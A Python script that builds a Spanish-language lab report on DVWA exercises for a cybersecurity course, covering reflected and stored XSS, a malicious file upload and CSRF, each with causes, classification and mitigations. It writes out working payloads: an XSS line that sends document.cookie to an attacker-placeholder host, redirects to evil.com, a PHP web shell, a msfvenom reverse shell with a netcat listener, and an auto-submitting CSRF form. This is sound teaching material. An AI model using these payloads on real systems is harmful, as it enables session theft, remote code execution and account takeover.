from docx import Document
from docx.shared import Pt, RGBColor, Inches, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import copy

doc = Document()

# ── Estilos generales ──────────────────────────────────────────────────────────
style = doc.styles['Normal']
style.font.name = 'Calibri'
style.font.size = Pt(11)

def set_col_widths(table, widths):
    for row in table.rows:
        for i, cell in enumerate(row.cells):
            cell.width = widths[i]

def add_heading(doc, text, level=1, color=None):
    heading = doc.add_heading(text, level=level)
    heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
    for run in heading.runs:
        run.font.name = 'Calibri'
        if color:
            run.font.color.rgb = RGBColor(*color)
    return heading

def add_paragraph(doc, text='', bold=False, italic=False, size=11):
    p = doc.add_paragraph()
    run = p.add_run(text)
    run.bold = bold
    run.italic = italic
    run.font.size = Pt(size)
    run.font.name = 'Calibri'
    return p

def add_code_block(doc, code):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(1)
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    run = p.add_run(code)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    # fondo gris claro
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), 'F3F3F3')
    pPr.append(shd)
    return p

def add_table_2col(doc, rows_data, header=None):
    cols = 2
    table = doc.add_table(rows=0, cols=cols)
    table.style = 'Table Grid'
    table.alignment = WD_TABLE_ALIGNMENT.LEFT
    if header:
        row = table.add_row()
        for i, txt in enumerate(header):
            cell = row.cells[i]
            cell.text = txt
            for run in cell.paragraphs[0].runs:
                run.bold = True
                run.font.name = 'Calibri'
                run.font.size = Pt(10)
            cell.paragraphs[0].runs[0].font.color.rgb = RGBColor(255,255,255)
            tc = cell._tc
            tcPr = tc.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), '2E4057')
            tcPr.append(shd)
    for r in rows_data:
        row = table.add_row()
        for i, txt in enumerate(r):
            row.cells[i].text = txt
            for run in row.cells[i].paragraphs[0].runs:
                run.font.name = 'Calibri'
                run.font.size = Pt(10)
    return table

# ═══════════════════════════════════════════════════════════════════════════════
# PORTADA
# ═══════════════════════════════════════════════════════════════════════════════
doc.add_paragraph()
title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = title.add_run('INFORME #1\nGestión de Vulnerabilidades en Aplicaciones')
run.bold = True
run.font.size = Pt(20)
run.font.name = 'Calibri'
run.font.color.rgb = RGBColor(30, 60, 90)

doc.add_paragraph()
sub = doc.add_paragraph()
sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
r2 = sub.add_run('DVWA: XSS Reflejado | XSS Almacenado | Upload Backdoor | CSRF')
r2.font.size = Pt(13)
r2.font.name = 'Calibri'
r2.italic = True

doc.add_paragraph()

meta = [
    ('Asignatura', 'Gestión de Vulnerabilidades en Aplicaciones'),
    ('Programa',   'Especialización en Ciberseguridad'),
    ('Docente',    'Javier Mauricio Durán Vásquez'),
    ('Estudiante', '[Nombre y Apellido]'),
    ('Entorno',    'Kali Linux + Metasploitable (DVWA)'),
    ('Fecha',      '28 de febrero de 2026'),
]
add_table_2col(doc, meta, header=['Campo', 'Detalle'])
doc.add_paragraph()

# ═══════════════════════════════════════════════════════════════════════════════
# ENTORNO DE TRABAJO
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Entorno de trabajo', level=1, color=(30,60,90))
env = [
    ('Atacante', 'Kali Linux — IP: 192.168.x.x — Prompt: [nombreapellido]@kali:~$'),
    ('Víctima',  'Metasploitable con DVWA — IP: 192.168.x.x'),
    ('Nivel DVWA', 'Low'),
    ('Herramientas', 'Burp Suite, Firefox, Netcat, msfvenom, Weevely'),
]
add_table_2col(doc, env)
doc.add_paragraph()

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILIDAD 1 — XSS REFLEJADO
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Vulnerabilidad 1 — XSS Reflejado (Cross-Site Scripting Reflected)', level=1, color=(180,30,30))

add_heading(doc, '1. Descripción de la vulnerabilidad', level=2)
add_paragraph(doc, 'El XSS Reflejado es una vulnerabilidad en la que el atacante inyecta código JavaScript malicioso en un parámetro de la solicitud HTTP. El servidor recibe ese input, no lo sanitiza y lo refleja directamente en la respuesta HTML, ejecutándose en el navegador de la víctima en el momento en que esta accede al enlace manipulado. El payload no persiste en la base de datos: vive únicamente en la URL del enlace que el atacante envía a la víctima.')

add_heading(doc, '2. Causas de la vulnerabilidad', level=2)
add_paragraph(doc, 'a. Ausencia de validaciones', bold=True)
add_paragraph(doc, 'El servidor no aplica ningún filtro sobre el parámetro name antes de interpolarlo en el HTML de respuesta:')
add_code_block(doc, '// Código vulnerable en DVWA (nivel Low)\n$name = $_GET[\'name\'];\necho "<pre>Hello " . $name . "</pre>";')
add_paragraph(doc, 'b. Errores de lógica', bold=True)
add_paragraph(doc, 'La aplicación confía ciegamente en que el dato enviado por el usuario es texto plano, sin distinguir entre datos válidos y código ejecutable.')
add_paragraph(doc, 'c. Manejo inadecuado de entradas y salidas', bold=True)
add_paragraph(doc, 'El valor es embebido directamente en el HTML sin aplicar codificación de caracteres especiales (<, >, ", \', &).')

add_heading(doc, '3. Mecanismo de ataque — Robo de cookie y secuestro de sesión', level=2)
add_paragraph(doc, 'Objetivo: Robar la cookie de sesión de la víctima y cargarla en el navegador del atacante para iniciar sesión sin credenciales.')
add_paragraph(doc, 'Paso 1 — Levantar listener en Kali Linux', bold=True)
add_code_block(doc, '[nombreapellido]@kali:~$ python3 -m http.server 8888')
add_paragraph(doc, 'Paso 2 — Payload XSS para robar cookie', bold=True)
add_code_block(doc, '<script>\n  new Image().src = "http://192.168.X.ATACANTE:8888/?cookie=" + document.cookie;\n</script>')
add_paragraph(doc, 'URL maliciosa construida para XSS Reflejado:')
add_code_block(doc, 'http://192.168.X.VICTIMA/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.X.ATACANTE:8888/?cookie="+document.cookie;</script>')
add_paragraph(doc, 'Paso 3 — Recepción de la cookie en el listener del atacante:', bold=True)
add_code_block(doc, '192.168.X.VICTIMA - "GET /?cookie=PHPSESSID=abc123xyz456 HTTP/1.1" 200 -')
add_paragraph(doc, 'Paso 4 — Inyección de cookie en el navegador atacante (consola F12):', bold=True)
add_code_block(doc, 'document.cookie = "PHPSESSID=abc123xyz456";')

p = doc.add_paragraph()
r = p.add_run('📸 [CAPTURA 1]: URL maliciosa en navegador | 📸 [CAPTURA 2]: Cookie recibida | 📸 [CAPTURA 3]: Sesión activa del atacante')
r.italic = True; r.font.size = Pt(9); r.font.color.rgb = RGBColor(100,100,200)

add_heading(doc, '4. Clasificación técnica', level=2)
add_table_2col(doc, [
    ('CWE', 'CWE-79: Improper Neutralization of Input During Web Page Generation'),
    ('OWASP Top 10', 'A03:2021 – Injection'),
    ('CVSS v3', '6.1 (Medium) — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'),
], header=['Clasificación','Referencia'])

add_heading(doc, '5. Impacto esperado en un sistema real', level=2)
add_table_2col(doc, [
    ('Confidencialidad', 'Alto — Robo de cookies, tokens de autenticación, datos en DOM'),
    ('Integridad', 'Medio — Modificación de contenido, phishing, redirecciones'),
    ('Disponibilidad', 'Bajo — No afecta directamente la disponibilidad'),
], header=['Dimensión','Impacto'])

add_heading(doc, '6. Propuesta de mitigación', level=2)
mitigaciones = [
    'Codificación de salida: htmlspecialchars($input, ENT_QUOTES, "UTF-8") en PHP.',
    'Content Security Policy (CSP): Content-Security-Policy: default-src \'self\'.',
    'Validación del lado del servidor con listas blancas de caracteres permitidos.',
    'Flags en cookies: HttpOnly y Secure para proteger el token de sesión.',
    'Sanitización con DOMPurify (JS) o HTMLPurifier (PHP).',
]
for m in mitigaciones:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(m).font.size = Pt(10)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILIDAD 2 — XSS ALMACENADO
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Vulnerabilidad 2 — XSS Almacenado (Cross-Site Scripting Stored)', level=1, color=(180,30,30))

add_heading(doc, '1. Descripción de la vulnerabilidad', level=2)
add_paragraph(doc, 'El XSS Almacenado (Persistente) es una variante del XSS en la que el payload malicioso es guardado permanentemente en la base de datos. Cada vez que un usuario legítimo carga la página afectada, el script malicioso se ejecuta automáticamente en su navegador. Esto lo hace más peligroso que el XSS Reflejado, ya que afecta a todos los usuarios que visiten la página comprometida.')

add_heading(doc, '2. Causas de la vulnerabilidad', level=2)
add_paragraph(doc, 'a. Ausencia de validaciones', bold=True)
add_code_block(doc, '// Código vulnerable (nivel Low)\n$name    = $_POST[\'txtName\'];\n$message = $_POST[\'mtxMessage\'];\n$query   = "INSERT INTO guestbook (comment, name) VALUES (\'$message\',\'$name\');";')
add_paragraph(doc, 'b. Errores de lógica', bold=True)
add_paragraph(doc, 'La aplicación trata los campos del formulario como datos confiables sin distinguir entre texto plano y código HTML/JavaScript.')
add_paragraph(doc, 'c. Manejo inadecuado de entradas y salidas', bold=True)
add_paragraph(doc, 'El dato persiste en BD con el código JavaScript intacto y al recuperarse se inserta sin codificación en el HTML renderizado.')

add_heading(doc, '3. Mecanismo de ataque — Redirección persistente', level=2)
add_paragraph(doc, 'Objetivo: Inyectar en la sección de foros un payload que redirija automáticamente a todos los usuarios a un sitio externo.')
add_paragraph(doc, 'Payload de redirección (campo Message):', bold=True)
add_code_block(doc, '<script>window.location.href=\'http://evil.com\';</script>')
add_paragraph(doc, 'Variante con redirección a página de phishing:', bold=True)
add_code_block(doc, '<script>\n  document.location = "http://192.168.X.ATACANTE/phishing/login.html";\n</script>')
add_paragraph(doc, 'Verificación en la base de datos MySQL:')
add_code_block(doc, 'SELECT * FROM dvwa.guestbook;\n-- El campo comment contiene el script inyectado')

p = doc.add_paragraph()
r = p.add_run('📸 [CAPTURA 4]: Payload en formulario | 📸 [CAPTURA 5]: Redirección al recargar | 📸 [CAPTURA 6]: Registro en BD con payload')
r.italic = True; r.font.size = Pt(9); r.font.color.rgb = RGBColor(100,100,200)

add_heading(doc, '4. Clasificación técnica', level=2)
add_table_2col(doc, [
    ('CWE', 'CWE-79: Improper Neutralization of Input During Web Page Generation'),
    ('CWE adicional', 'CWE-116: Improper Encoding or Escaping of Output'),
    ('OWASP Top 10', 'A03:2021 – Injection'),
    ('CVSS v3', '8.8 (High) — Mayor impacto por persistencia y múltiples víctimas'),
], header=['Clasificación','Referencia'])

add_heading(doc, '5. Impacto esperado en un sistema real', level=2)
add_table_2col(doc, [
    ('Confidencialidad', 'Alto — Keylogging, robo masivo de sesiones de todos los usuarios'),
    ('Integridad', 'Alto — Modificación permanente del contenido, distribución de malware'),
    ('Disponibilidad', 'Medio — Redirección masiva o degradación de experiencia de usuario'),
], header=['Dimensión','Impacto'])

add_heading(doc, '6. Propuesta de mitigación', level=2)
for m in [
    'Sanitización en almacenamiento: strip_tags() y htmlspecialchars() antes de insertar en BD.',
    'Sanitización en recuperación: htmlentities() al extraer datos para mostrarlos.',
    'Validación de longitud máxima de campos.',
    'WAF con reglas OWASP CRS (ModSecurity) para detectar payloads XSS.',
    'CSP: Content-Security-Policy: script-src \'self\' para bloquear scripts inline.',
]:
    doc.add_paragraph(m, style='List Bullet').runs[0].font.size = Pt(10)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILIDAD 3 — UPLOAD BACKDOOR
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Vulnerabilidad 3 — Upload Backdoor (File Upload Malicioso)', level=1, color=(180,30,30))

add_heading(doc, '1. Descripción de la vulnerabilidad', level=2)
add_paragraph(doc, 'La vulnerabilidad de subida de archivos maliciosos ocurre cuando una aplicación permite cargar archivos al servidor sin validar correctamente el tipo, extensión o contenido. Un atacante puede subir una shell web que, al ser accedida vía web, proporcione ejecución remota de comandos (RCE) sobre el servidor víctima.')

add_heading(doc, '2. Causas de la vulnerabilidad', level=2)
add_paragraph(doc, 'a. Ausencia de validaciones', bold=True)
add_code_block(doc, '// Código vulnerable (nivel Low)\n$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";\n$target_path .= basename( $_FILES[\'uploaded\'][\'name\'] );\nmove_uploaded_file( $_FILES[\'uploaded\'][\'tmp_name\'], $target_path );')
add_paragraph(doc, 'b. Errores de lógica', bold=True)
add_paragraph(doc, 'La lógica asume que el usuario solo subirá imágenes legítimas sin implementar ninguna restricción técnica.')
add_paragraph(doc, 'c. Manejo inadecuado de entradas', bold=True)
add_paragraph(doc, 'El archivo sube con su nombre y extensión originales sin verificar los magic bytes del archivo.')

add_heading(doc, '3. Mecanismo de ataque — Shell reversa PHP', level=2)
add_paragraph(doc, 'Objetivo: Subir un archivo PHP malicioso y obtener una consola de sistema operativo en el servidor.')
add_paragraph(doc, 'Paso 1 — Crear shell PHP simple:', bold=True)
add_code_block(doc, "[nombreapellido]@kali:~$ echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php")
add_paragraph(doc, 'Paso 2 — Crear reverse shell con msfvenom:', bold=True)
add_code_block(doc, '[nombreapellido]@kali:~$ msfvenom -p php/reverse_php LHOST=192.168.X.ATACANTE LPORT=4444 -f raw > shell.php')
add_paragraph(doc, 'Paso 3 — Iniciar listener Netcat:', bold=True)
add_code_block(doc, '[nombreapellido]@kali:~$ nc -lvnp 4444')
add_paragraph(doc, 'Paso 4 — Subir el archivo por el formulario DVWA y acceder a:', bold=True)
add_code_block(doc, 'http://192.168.X.VICTIMA/dvwa/hackable/uploads/shell.php')
add_paragraph(doc, 'Paso 5 — Sesión obtenida:', bold=True)
add_code_block(doc, 'Connection received on 192.168.X.VICTIMA\nid\nuid=33(www-data) gid=33(www-data)\nwhoami\nwww-data')

p = doc.add_paragraph()
r = p.add_run('📸 [CAPTURA 7]: Formulario con shell.php | 📸 [CAPTURA 8]: Confirmación subida | 📸 [CAPTURA 9]: Shell activa con comandos')
r.italic = True; r.font.size = Pt(9); r.font.color.rgb = RGBColor(100,100,200)

add_heading(doc, '4. Clasificación técnica', level=2)
add_table_2col(doc, [
    ('CWE', 'CWE-434: Unrestricted Upload of File with Dangerous Type'),
    ('CWE adicional', 'CWE-552: Files or Directories Accessible to External Parties'),
    ('OWASP Top 10', 'A04:2021 – Insecure Design / A05:2021 – Security Misconfiguration'),
    ('CVSS v3', '9.8 (Critical) — Ejecución remota de código sin autenticación'),
], header=['Clasificación','Referencia'])

add_heading(doc, '5. Impacto esperado en un sistema real', level=2)
add_table_2col(doc, [
    ('Confidencialidad', 'Crítico — Acceso al sistema de archivos, credenciales, bases de datos'),
    ('Integridad', 'Crítico — Modificación de archivos, defacement, instalación de malware'),
    ('Disponibilidad', 'Crítico — Apagado de servicios, ransomware, DoS'),
], header=['Dimensión','Impacto'])

add_heading(doc, '6. Propuesta de mitigación', level=2)
for m in [
    'Validación de tipo MIME real: verificar magic bytes, no la extensión declarada.',
    'Lista blanca de extensiones: permitir solo .jpg, .png, .gif.',
    'Renombrar archivos con nombre aleatorio al guardar.',
    'Almacenamiento fuera del webroot: directorio no accesible directamente.',
    'Servir archivos con Content-Disposition: attachment para evitar ejecución.',
    'Escaneo antivirus de archivos subidos antes de almacenarlos.',
]:
    doc.add_paragraph(m, style='List Bullet').runs[0].font.size = Pt(10)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILIDAD 4 — CSRF
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Vulnerabilidad 4 — CSRF (Cross-Site Request Forgery)', level=1, color=(180,30,30))

add_heading(doc, '1. Descripción de la vulnerabilidad', level=2)
add_paragraph(doc, 'CSRF es un ataque en el que el atacante induce a una víctima autenticada a realizar una acción no deseada en una aplicación web. El navegador envía automáticamente las cookies de sesión con cada solicitud, por lo que la aplicación cree que la petición es legítima aunque haya sido forjada desde otro sitio.')

add_heading(doc, '2. Causas de la vulnerabilidad', level=2)
add_paragraph(doc, 'a. Ausencia de validaciones', bold=True)
add_code_block(doc, '// Código vulnerable — Change Password DVWA\nif( isset( $_GET[ \'Change\' ] ) ) {\n    $pass_new  = $_GET[ \'password_new\' ];\n    $pass_conf = $_GET[ \'password_conf\' ];\n    if( $pass_new == $pass_conf ) {\n        $insert = "UPDATE users SET password = md5(\'$pass_new\')";\n        mysqli_query($GLOBALS["___mysqli_ston"], $insert);\n    }\n}')
add_paragraph(doc, 'b. Errores de lógica', bold=True)
add_paragraph(doc, 'La aplicación no exige que la petición provenga del propio sitio ni que el usuario haya iniciado explícitamente la acción.')
add_paragraph(doc, 'c. Manejo inadecuado de entradas', bold=True)
add_paragraph(doc, 'Los parámetros sensibles viajan en la URL (método GET), facilitando la construcción de enlaces maliciosos.')

add_heading(doc, '3. Mecanismo de ataque — Cambio de contraseña de la víctima', level=2)
add_paragraph(doc, 'Objetivo: Falsificar una petición que cambie la contraseña del usuario víctima sin su conocimiento.')
add_paragraph(doc, 'Paso 1 — Petición legítima interceptada con Burp Suite:', bold=True)
add_code_block(doc, 'GET /dvwa/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change HTTP/1.1\nHost: 192.168.X.VICTIMA\nCookie: PHPSESSID=abc123xyz456; security=low')
add_paragraph(doc, 'Paso 2 — Página HTML maliciosa (csrf_attack.html):', bold=True)
add_code_block(doc, '<!DOCTYPE html>\n<html>\n<body onload="document.forms[0].submit()">\n  <form action="http://192.168.X.VICTIMA/dvwa/vulnerabilities/csrf/" method="GET" style="display:none;">\n    <input type="hidden" name="password_new"  value="hackeado123" />\n    <input type="hidden" name="password_conf" value="hackeado123" />\n    <input type="hidden" name="Change"        value="Change" />\n  </form>\n  <h1>Cargando tu premio...</h1>\n</body>\n</html>')
add_paragraph(doc, 'Paso 3 — Servir la página y enviar enlace a la víctima:', bold=True)
add_code_block(doc, '[nombreapellido]@kali:~$ python3 -m http.server 80\n# Enlace enviado: http://192.168.X.ATACANTE/csrf_attack.html')
add_paragraph(doc, 'Paso 4 — Al abrir el enlace, la víctima activa el formulario automáticamente. El servidor cambia la contraseña a "hackeado123".')
add_paragraph(doc, 'Paso 5 — Verificación: el atacante inicia sesión con admin / hackeado123 exitosamente.')

p = doc.add_paragraph()
r = p.add_run('📸 [CAPTURA 10]: HTML malicioso y Burp Suite | 📸 [CAPTURA 11]: Respuesta confirmando cambio | 📸 [CAPTURA 12]: Login con nueva contraseña')
r.italic = True; r.font.size = Pt(9); r.font.color.rgb = RGBColor(100,100,200)

add_heading(doc, '4. Clasificación técnica', level=2)
add_table_2col(doc, [
    ('CWE', 'CWE-352: Cross-Site Request Forgery (CSRF)'),
    ('CWE adicional', 'CWE-346: Origin Validation Error'),
    ('OWASP Top 10', 'A01:2021 – Broken Access Control'),
    ('CVSS v3', '8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'),
], header=['Clasificación','Referencia'])

add_heading(doc, '5. Impacto esperado en un sistema real', level=2)
add_table_2col(doc, [
    ('Confidencialidad', 'Alto — Acceso no autorizado tras cambio de credenciales'),
    ('Integridad', 'Alto — Modificación de contraseñas, configuraciones, transacciones'),
    ('Disponibilidad', 'Medio — Bloqueo de la cuenta legítima'),
], header=['Dimensión','Impacto'])

add_heading(doc, '6. Propuesta de mitigación', level=2)
for m in [
    'Token CSRF (Synchronizer Token Pattern): generar token único por sesión y validarlo en cada petición.',
    'SameSite Cookie: configurar SameSite=Strict o SameSite=Lax en las cookies de sesión.',
    'Verificación del encabezado Origin/Referer para confirmar el origen de la petición.',
    'Re-autenticación para acciones críticas: solicitar contraseña actual antes de cambiarla.',
    'Usar POST en lugar de GET para operaciones que modifican estado.',
    'Double Submit Cookie: enviar el token en cookie y en parámetro oculto del formulario.',
]:
    doc.add_paragraph(m, style='List Bullet').runs[0].font.size = Pt(10)

doc.add_page_break()

# ═══════════════════════════════════════════════════════════════════════════════
# REFLEXIÓN Y REFERENCIAS
# ═══════════════════════════════════════════════════════════════════════════════
add_heading(doc, 'Reflexión Personal', level=1, color=(30,90,60))
reflexion = (
    'Durante el desarrollo de este laboratorio, asumiendo el rol de auditor de seguridad '
    'sobre la plataforma DVWA, se evidenció de manera práctica cómo vulnerabilidades aparentemente '
    'simples pueden derivar en compromisos críticos de la seguridad de un sistema real.\n\n'
    'El XSS Reflejado y el XSS Almacenado se originan en la misma causa raíz: confiar en el input '
    'del usuario sin codificación de salida. Sin embargo, el impacto del XSS Almacenado es '
    'significativamente mayor por su persistencia y escala, afectando a todos los usuarios '
    'que visiten la página comprometida.\n\n'
    'El laboratorio de Upload Backdoor fue el de mayor impacto tangible: en cuestión de minutos '
    'se obtuvo ejecución remota de comandos sobre el servidor víctima, lo que en un entorno '
    'productivo implicaría el compromiso total del sistema.\n\n'
    'El ataque CSRF resultó ser el más silencioso: la víctima no percibe ninguna señal de alerta, '
    'y explota la confianza implícita que el navegador deposita en las cookies de sesión.\n\n'
    'En términos de aplicabilidad profesional, estas prácticas refuerzan la importancia de integrar '
    'la seguridad desde las etapas tempranas del desarrollo (DevSecOps), realizar pentesting '
    'periódico y educar a los equipos de desarrollo en los principios de OWASP.'
)
add_paragraph(doc, reflexion)

add_heading(doc, 'Referencias', level=1, color=(30,60,90))
refs = [
    'OWASP Foundation. (2021). OWASP Top Ten 2021. https://owasp.org/www-project-top-ten/',
    'MITRE Corporation. (2024). CWE-79: Cross-site Scripting. https://cwe.mitre.org/data/definitions/79.html',
    'MITRE Corporation. (2024). CWE-352: Cross-Site Request Forgery. https://cwe.mitre.org/data/definitions/352.html',
    'MITRE Corporation. (2024). CWE-434: Unrestricted Upload of File. https://cwe.mitre.org/data/definitions/434.html',
    'PortSwigger. (2024). Web Security Academy — XSS. https://portswigger.net/web-security/cross-site-scripting',
    'PortSwigger. (2024). Web Security Academy — CSRF. https://portswigger.net/web-security/csrf',
    'Stuttard, D., & Pinto, M. (2011). The Web Application Hacker\'s Handbook. Wiley.',
    'Durán Vásquez, J. M. (2026). Guía de Trabajo Práctico No. 1. ITM.',
]
for r in refs:
    p = doc.add_paragraph(style='List Number')
    p.add_run(r).font.size = Pt(10)

# Nota final
doc.add_paragraph()
nota = doc.add_paragraph()
nota.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = nota.add_run('⚠️  Reemplazar los marcadores [CAPTURA N] con las capturas reales de pantalla obtenidas en la práctica,\nmostrando la fecha del sistema visible y el prompt personalizado [nombreapellido]@kali:~$')
run.italic = True
run.font.size = Pt(9)
run.font.color.rgb = RGBColor(150, 80, 0)

# ── Guardar ────────────────────────────────────────────────────────────────────
output = r'c:\Users\Usuario\Desktop\Especializacion CS\01_Materias\Gestion_de_Vulnerabilidades_en_Aplicaciones\INFORME_1_GVA.docx'
doc.save(output)
print(f'Documento guardado en: {output}')
